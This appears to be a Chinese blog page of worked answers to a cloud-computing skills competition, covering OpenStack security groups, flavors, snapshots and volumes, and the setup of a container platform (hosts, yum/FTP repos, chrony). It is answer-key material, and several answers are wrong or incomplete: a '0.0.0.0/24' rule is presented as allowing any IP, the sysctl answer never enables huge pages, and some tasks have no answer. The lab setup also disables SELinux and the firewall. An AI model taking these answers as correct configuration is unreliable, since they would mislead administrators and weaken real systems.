9c74fd04-d37a-4501-9632-05d82388ac59 |</span><br><span class="line">| updated_at        | 2022-10-09T03:48:08Z                 |</span><br><span class="line">+-------------------+--------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建安全组group_web</span></span><br><span class="line">openstack security group create group_web --project demo --description 31</span><br><span class="line"><span class="comment">#允许任意ip访问web</span></span><br><span class="line">openstack security group rule create group_web --ingress  --dst-port 80:80 --remote-ip 0.0.0.0/24 --protocol tcp</span><br><span class="line">openstack security group rule create group_web --ingress  --dst-port 443:443 --remote-ip 0.0.0.0/24 --protocol tcp</span><br><span class="line"><span class="comment">#允许访问22端口</span></span><br><span class="line">openstack security group rule create group_web --ingress  --dst-port 22:22 --remote-ip 0.0.0.0/24</span><br></pre></td></tr></table></figure>

<h3 id="3-创建名为nginx的云主机类型，要求VCPU-1内存1024M根磁盘10G"><a href="#3-创建名为nginx的云主机类型，要求VCPU-1内存1024M根磁盘10G" class="headerlink" title="3.创建名为nginx的云主机类型，要求VCPU 1内存1024M根磁盘10G"></a>3.创建名为nginx的云主机类型，要求VCPU 1内存1024M根磁盘10G</h3><p>请将openstack命令提交至答题框。【1分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# nova flavor-create nginx 1 1024 10 1</span><br><span class="line">+----+-------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line">| ID | Name  | Memory_MB | Disk | Ephemeral | Swap | VCPUs | RXTX_Factor | Is_Public | Description |</span><br><span class="line">+----+-------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line">| 1  | nginx | 1024      | 10   | 0         |      | 1     | 1.0         | True      | -           |</span><br><span class="line">+----+-------+-----------+------+-----------+------+-------+-------------+-----------+-------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-修改相关配置，关闭nginx云主机的系统的内存共享，打开透明大页，并且保证nginx云主机的安全，配置禁止其他节点可以ping它"><a href="#5-修改相关配置，关闭nginx云主机的系统的内存共享，打开透明大页，并且保证nginx云主机的安全，配置禁止其他节点可以ping它" class="headerlink" title="5.修改相关配置，关闭nginx云主机的系统的内存共享，打开透明大页，并且保证nginx云主机的安全，配置禁止其他节点可以ping它"></a>5.修改相关配置，关闭nginx云主机的系统的内存共享，打开透明大页，并且保证nginx云主机的安全，配置禁止其他节点可以ping它</h3><p>请将sysctl -p命令的返回结果提交至答题框。【1分】</p>
<p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20221009143743430.png" alt="image-20221009143743430"></p>
<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br><span class="line">kernel.shmmax = 0</span><br><span class="line">kernel.shmall = 0</span><br><span class="line">kernel.shmmni = 0 </span><br><span class="line">net.ipv4.icmp_echo_ignore_all = 1</span><br></pre></td></tr></table></figure>

<h3 id="6-通过ceilometer组件，使用命令行查询nginx云主机CPU使用情况。"><a href="#6-通过ceilometer组件，使用命令行查询nginx云主机CPU使用情况。" class="headerlink" title="6.通过ceilometer组件，使用命令行查询nginx云主机CPU使用情况。"></a>6.通过ceilometer组件，使用命令行查询nginx云主机CPU使用情况。</h3><p>请将gnocchi metric list命令的返回结果提交至答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ceilometer meter-list </span><br><span class="line"></span><br><span class="line">+---------------------------------------------+------------+-----------+-----------------------------------------------------------------------+----------------------------------+----------------------------------+</span><br><span class="line">| Name                                        | Type       | Unit      | Resource ID                                                           | User ID                          | Project ID                       |</span><br><span class="line">+---------------------------------------------+------------+-----------+-----------------------------------------------------------------------+----------------------------------+----------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">| cpu                                         | cumulative | ns        | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| cpu_util                                    | gauge      | %         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.allocation                             | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.capacity                               | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.device.allocation                      | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.device.capacity                        | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.device.read.bytes                      | cumulative | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.device.read.bytes.rate                 | gauge      | B/s       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.device.usage                           | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.device.write.bytes                     | cumulative | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.device.write.bytes.rate                | gauge      | B/s       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d-vda                              | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.read.bytes                             | cumulative | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.read.bytes.rate                        | gauge      | B/s       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.read.requests                          | cumulative | request   | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.read.requests.rate                     | gauge      | request/s | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.total.size                             | gauge      | GB        | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.usage                                  | gauge      | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.write.bytes                            | cumulative | B         | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.write.bytes.rate                       | gauge      | B/s       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.write.requests                         | cumulative | request   | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| disk.write.requests.rate                    | gauge      | request/s | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| instance                                    | gauge      | instance  | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| memory                                      | gauge      | MB        | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| memory.usage                                | gauge      | MB        | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.incoming.bytes                      | cumulative | B         | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.incoming.bytes.rate                 | gauge      | B/s       | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.incoming.packets                    | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.incoming.packets.drop               | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.incoming.packets.error              | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.incoming.packets.rate               | gauge      | packet/s  | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.outgoing.bytes                      | cumulative | B         | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.outgoing.bytes.rate                 | gauge      | B/s       | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.outgoing.packets                    | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.outgoing.packets.drop               | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.outgoing.packets.error              | cumulative | packet    | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| network.outgoing.packets.rate               | gauge      | packet/s  | instance-00000067-823bf8b4-96b4-4614-ab0e-49fba80bd13d-ovkb478c1ea-ce | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| poweron                                     | gauge      | N/A       | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br><span class="line">| vcpus                                       | gauge      | vcpu      | 823bf8b4-96b4-4614-ab0e-49fba80bd13d                                  | 6e2f1fdf1e3c4cae95ce8bb09ec99431 | d448a43772e5434592baf9217e9a1b82 |</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#分别安装ceilometer组件</span><br><span class="line">controller： iaas-install-ceilometer-controller.sh</span><br><span class="line">compute: iaas-install-ceilometer-compute.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="7-使用命令行创建云主机nginx快照，命名为nginx-snap-使用qemu相关命令查询该快照磁盘详细属性。"><a href="#7-使用命令行创建云主机nginx快照，命名为nginx-snap-使用qemu相关命令查询该快照磁盘详细属性。" class="headerlink" title="7.使用命令行创建云主机nginx快照，命名为nginx_snap,使用qemu相关命令查询该快照磁盘详细属性。"></a>7.使用命令行创建云主机nginx快照，命名为nginx_snap,使用qemu相关命令查询该快照磁盘详细属性。</h3><p>请将qemu-img info nginx_snap.qcow2命令的返回结果提交至答题框。【2分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@controller images]# qemu-img info 5eae1a37-7ae9-4c4a-98c5-f477183eb818</span><br><span class="line">image: 5eae1a37-7ae9-4c4a-98c5-f477183eb818</span><br><span class="line">file format: qcow2</span><br><span class="line">virtual size: 10G (10737418240 bytes)</span><br><span class="line">disk size: 1.7G</span><br><span class="line">cluster_size: 65536</span><br><span class="line">Format specific information:</span><br><span class="line">    compat: 1.1</span><br><span class="line">    lazy refcounts: <span class="literal">false</span></span><br><span class="line">    refcount bits: 16</span><br><span class="line">    corrupt: <span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看云主机id</span></span><br><span class="line">nova list</span><br><span class="line"><span class="comment">#创建快照</span></span><br><span class="line">nova image-create b8095ceb-005c-4ca8-88be-dbdd7bec39ac <span class="string">&quot;nginx_snap&quot;</span></span><br><span class="line"><span class="comment">#进入后端</span></span><br><span class="line"><span class="built_in">cd</span> /var/lib/glance/images</span><br><span class="line"><span class="comment">#查看快照的id后，查看详细属性</span></span><br><span class="line">qemu-img info 5eae1a37-7ae9-4c4a-98c5-f477183eb818</span><br></pre></td></tr></table></figure>



<h3 id="8-执行iaas-install-cinder-controller-sh和iaas-install-cinder-compute-sh脚本，在controller和compute节点上安装cinder服务并完成配置，创建一个名为lvm的卷类型，创建该类型规格键值对，要求lvm卷类型对应cinder后端驱动lvm所管理的存储资源。创建一块带这个卷类型标识的云硬盘lvm-test，查询该云硬盘的详细信息。"><a href="#8-执行iaas-install-cinder-controller-sh和iaas-install-cinder-compute-sh脚本，在controller和compute节点上安装cinder服务并完成配置，创建一个名为lvm的卷类型，创建该类型规格键值对，要求lvm卷类型对应cinder后端驱动lvm所管理的存储资源。创建一块带这个卷类型标识的云硬盘lvm-test，查询该云硬盘的详细信息。" class="headerlink" title="8.执行iaas-install-cinder-controller .sh和iaas-install-cinder-compute.sh脚本，在controller和compute节点上安装cinder服务并完成配置，创建一个名为lvm的卷类型，创建该类型规格键值对，要求lvm卷类型对应cinder后端驱动lvm所管理的存储资源。创建一块带这个卷类型标识的云硬盘lvm_test，查询该云硬盘的详细信息。"></a>8.执行iaas-install-cinder-controller .sh和iaas-install-cinder-compute.sh脚本，在controller和compute节点上安装cinder服务并完成配置，创建一个名为lvm的卷类型，创建该类型规格键值对，要求lvm卷类型对应cinder后端驱动lvm所管理的存储资源。创建一块带这个卷类型标识的云硬盘lvm_test，查询该云硬盘的详细信息。</h3><p>请将cinder show lvm_test命令的返回结果提交至答题框。【2分】</p>
<h3 id="9-将该云硬盘挂载到nginx云主机中，将该云硬盘格式化为xfs。永久挂载至-opt目录，创建一个文件文件名为工位号内容为工位号。"><a href="#9-将该云硬盘挂载到nginx云主机中，将该云硬盘格式化为xfs。永久挂载至-opt目录，创建一个文件文件名为工位号内容为工位号。" class="headerlink" title="9.将该云硬盘挂载到nginx云主机中，将该云硬盘格式化为xfs。永久挂载至&#x2F;opt目录，创建一个文件文件名为工位号内容为工位号。"></a>9.将该云硬盘挂载到nginx云主机中，将该云硬盘格式化为xfs。永久挂载至&#x2F;opt目录，创建一个文件文件名为工位号内容为工位号。</h3><p>请将cat &#x2F;etc&#x2F;fstab的返回结果提交至答题框。【1分】</p>
<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#绑定nginx主机</span></span><br><span class="line">openstack server  add volume nginx test_lvm</span><br><span class="line"><span class="comment">#将云硬盘格式化为xfs</span></span><br><span class="line">mkfs.xfs /dev/vdb</span><br><span class="line"><span class="comment">#永久挂在</span></span><br><span class="line">vi /etc/fstab</span><br><span class="line">/dev/vdb /opt xfs     defaults        0 0</span><br></pre></td></tr></table></figure>



<h3 id="10-编写server-volume-yaml文件，通过heat组件实现自动化部署-发放1台云主机，主机名称为my-server-1，镜像为nginx，云主机类型为nginx，网络为int-net1，创建大小为1G的云硬盘，挂载至my-server-1"><a href="#10-编写server-volume-yaml文件，通过heat组件实现自动化部署-发放1台云主机，主机名称为my-server-1，镜像为nginx，云主机类型为nginx，网络为int-net1，创建大小为1G的云硬盘，挂载至my-server-1" class="headerlink" title="10.编写server_volume.yaml文件，通过heat组件实现自动化部署:发放1台云主机，主机名称为my server_1，镜像为nginx，云主机类型为nginx，网络为int-net1，创建大小为1G的云硬盘，挂载至my_server_1"></a>10.编写server_volume.yaml文件，通过heat组件实现自动化部署:发放1台云主机，主机名称为my server_1，镜像为nginx，云主机类型为nginx，网络为int-net1，创建大小为1G的云硬盘，挂载至my_server_1</h3><p>将server_volume.yaml文件中的内容提交至答题框。【3分】</p>
<h1 id="B场次题目-容器的编排与运维"><a href="#B场次题目-容器的编排与运维" class="headerlink" title="B场次题目:容器的编排与运维"></a>B场次题目:容器的编排与运维</h1><table>
<thead>
<tr>
<th>设备名称</th>
<th>主机名</th>
<th>接口</th>
<th>IP地址</th>
</tr>
</thead>
<tbody><tr>
<td>虚拟机1</td>
<td>master</td>
<td>ens33</td>
<td>192.168.200.162</td>
</tr>
<tr>
<td>虚拟机2</td>
<td>node1</td>
<td>ens33</td>
<td>192.168.200.163</td>
</tr>
<tr>
<td>虚拟机3</td>
<td>node2</td>
<td>ens33</td>
<td>192.168.200.164</td>
</tr>
<tr>
<td>虚拟机4</td>
<td>node3</td>
<td>ens33</td>
<td>192.168.200.165</td>
</tr>
</tbody></table>
<h2 id="任务1-容器云平台环境初始化（5分）"><a href="#任务1-容器云平台环境初始化（5分）" class="headerlink" title="任务1 容器云平台环境初始化（5分）"></a>任务1 容器云平台环境初始化（5分）</h2><h3 id="1-容器云平台的初始化"><a href="#1-容器云平台的初始化" class="headerlink" title="1.容器云平台的初始化"></a>1.容器云平台的初始化</h3><p>根据表2中的IP地址规划，创建云服务器，镜像使用CentOS_7.5_x86_64_XD.qcow，确保网络正常通信。按照表1设置主机名节点并关闭swap，同时永久关闭selinux以及防火墙,并修改hosts映射。</p>
<p>请将master节点hosts文件内容提交至答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">192.168.200.162 master</span><br><span class="line">192.168.200.163 node1</span><br><span class="line">192.168.200.164 node2</span><br><span class="line">192.168.200.165 harbor</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>master</strong></p>
<p>其他节点修改主机名即可，其他命令相同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname master</span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">   SELINUX=disabled</span><br><span class="line">swapoff -a</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld </span><br><span class="line">vi /etc/hosts</span><br><span class="line">192.168.200.162 master</span><br><span class="line">192.168.200.163 node1</span><br><span class="line">192.168.200.164 node2</span><br><span class="line">192.168.200.165 harbor</span><br></pre></td></tr></table></figure>

<h3 id="2-Yum源数据的持久化挂载"><a href="#2-Yum源数据的持久化挂载" class="headerlink" title="2.Yum源数据的持久化挂载"></a>2.Yum源数据的持久化挂载</h3><p>将提供的CentOS-7-x86_64-DVD-1804.iso和bricsskills_cloud_paas.iso光盘镜像移动到master节点&#x2F;root目录下，然后在&#x2F;opt目录下使用命令创建&#x2F;centos目录和&#x2F;paas目录，并将镜像文件CentOS-7-x86_64-DVD-1804.iso永久挂载到&#x2F;centos目录下，将镜像文件bricsskills_cloud_paas.iso永久挂载到&#x2F;paas目录下。</p>
<p>请将cat &#x2F;etc&#x2F;fstab的返回结果提交到答题框。【1分】</p>
<p><strong>若无bricsskills_cloud_paas.iso使用chinaskil也可以</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/fstab</span><br><span class="line">/root/CentOS-7-x86_64-DVD-1804.iso  /opt/centos iso9660 defaults 0 0</span><br><span class="line">/root/chinaskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /opt/centos</span><br><span class="line"><span class="built_in">mkdir</span> /opt/paas</span><br><span class="line">mount CentOS-7-x86_64-DVD-1804.iso  /opt/centos</span><br><span class="line">mount chinaskills_cloud_paas.iso /opt/paas</span><br><span class="line"></span><br><span class="line">vi /etc/fstab</span><br><span class="line">/root/CentOS-7-x86_64-DVD-1804.iso  /opt/centos iso9660 defaults 0 0</span><br><span class="line">/root/chinaskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0</span><br><span class="line"></span><br><span class="line">mount -a</span><br></pre></td></tr></table></figure>

<h3 id="3-Yum源的编写"><a href="#3-Yum源的编写" class="headerlink" title="3.Yum源的编写"></a>3.Yum源的编写</h3><p>为master节点设置本地yum源，yum源文件名为local.repo，安装ftp服务，将ftp仓库设置为&#x2F;opt&#x2F;，为node1节点和node2节点配置ftp源,yum源文件名称为ftp.repo，其中ftp服务器地址为master节点,配置ftp源时不要写IP地址。</p>
<p>请将ftp.repo文件中的内容提交到答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/yum.repos.d/ftp.repo</span><br><span class="line"></span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://master/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[k8s]</span><br><span class="line">name=k8s</span><br><span class="line">baseurl=ftp://master/paas/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>master</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /etc/yum</span><br><span class="line">vi /etc/yum.repos.d/centos.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[k8s]</span><br><span class="line">name=k8s</span><br><span class="line">baseurl=file:///opt/paas/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"><span class="comment">#安装vsftpd服务</span></span><br><span class="line">yum install -y vsftpd</span><br><span class="line">vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">  anon_root=/opt/</span><br><span class="line">systemctl start vsftpd</span><br><span class="line">systemctl <span class="built_in">enable</span> vsftpd</span><br><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">/usr/sbin/iptables-save</span><br></pre></td></tr></table></figure>

<p><strong>其他节点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/* /etc/yum</span><br><span class="line">vi /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://master/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[k8s]</span><br><span class="line">name=k8s</span><br><span class="line">baseurl=ftp://master/paas/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">/usr/sbin/iptables-save</span><br></pre></td></tr></table></figure>

<h3 id="4-设置时间同步服务器"><a href="#4-设置时间同步服务器" class="headerlink" title="4.设置时间同步服务器"></a>4.设置时间同步服务器</h3><p>在master节点上部署chrony服务器，允许其他节点同步时间，启动服务并设置为开机启动;在其他节点上指定master节点为上游NTP服务器，重启服务并设为开机启动。</p>
<p>请在master节点将cat &#x2F;etc&#x2F;chrony.conf | grep server命令的返回结果提交到答题框。【1分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@master ~]# <span class="built_in">cat</span> /etc/chrony.conf | grep server</span><br><span class="line"><span class="comment"># Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server master iburst</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<p><strong>master</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/chrony.conf</span><br><span class="line"><span class="comment"># Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="comment"># Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server master iburst</span><br><span class="line"><span class="comment"># Record the rate at which the system clock gains/losses time.</span></span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow the system clock to be stepped in the first three updates</span></span><br><span class="line"><span class="comment"># if its offset is larger than 1 second.</span></span><br><span class="line">makestep 1.0 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable kernel synchronization of the real-time clock (RTC).</span></span><br><span class="line">rtcsync</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable hardware timestamping on all interfaces that support it.</span></span><br><span class="line"><span class="comment">#hwtimestamp *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Increase the minimum number of selectable sources required to adjust</span></span><br><span class="line"><span class="comment"># the system clock.</span></span><br><span class="line"><span class="comment">#minsources 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow NTP client access from local network.</span></span><br><span class="line"><span class="comment">#allow 192.168.0.0/16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Serve time even if not synchronized to a time source.</span></span><br><span class="line"><span class="comment">#local stratum 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify file containing keys for NTP authentication.</span></span><br><span class="line"><span class="comment">#keyfile /etc/chrony.keys</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify directory for log files.</span></span><br><span class="line">logdir /var/log/chrony</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select which information is logged.</span></span><br><span class="line"><span class="comment">#log measurements statistics tracking</span></span><br><span class="line">allow 10.0.0.0/24</span><br><span class="line"><span class="built_in">local</span> stratum 10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemctl restart chronyd</span><br><span class="line">systemctl <span class="built_in">enable</span> chronyd</span><br></pre></td></tr></table></figure>

<p><strong>其他节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/chrony.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="comment"># Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="comment">#server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="comment">#server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server master iburst</span><br><span class="line"><span class="comment"># Record the rate at which the system clock gains/losses time.</span></span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow the system clock to be stepped in the first three updates</span></span><br><span class="line"><span class="comment"># if its offset is larger than 1 second.</span></span><br><span class="line">makestep 1.0 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable kernel synchronization of the real-time clock (RTC).</span></span><br><span class="line">rtcsync</span><br><span 